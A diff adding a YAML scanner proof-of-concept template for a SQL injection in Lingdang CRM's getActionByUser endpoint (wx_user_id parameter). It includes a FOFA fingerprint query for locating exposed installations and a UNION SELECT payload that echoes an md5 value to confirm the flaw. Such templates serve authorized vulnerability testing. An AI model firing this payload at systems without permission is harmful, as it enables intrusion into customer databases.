@@ -1,0 +1,19 @@
+id: poc-yaml-51mis-crm-getactionbyuser-wx-user-id-sqli
+info:
+  name: 灵当CRM getActionByUser wx_user_id SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionByUser&wx_user_id=1+UNION+ALL+SELECT+NULL,NULL,md5({{.t1}}),NULL,NULL--+-&keyWords=&page=
+  expression: "status_code == 200 && \ncontains(body,\"\\\"curpagenum\\\"\") &&\n\
+    contains(body,\"\\\"totalrows\\\"\") &&\ncontains(body,t2) &&\n!contains(body,\"\
+    <\")\n"
+transport: http
